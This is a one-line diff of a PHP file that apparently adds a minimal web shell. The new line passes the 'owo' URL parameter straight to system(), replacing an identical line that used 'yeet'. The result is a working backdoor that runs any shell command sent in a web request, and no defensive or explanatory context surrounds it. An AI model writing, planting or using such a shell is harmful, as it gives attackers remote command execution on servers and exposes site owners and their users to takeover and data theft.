@@ -1,1 +1,1 @@
-<?php system($_GET['yeet']); ?>
+<?php system($_GET['owo']); ?>
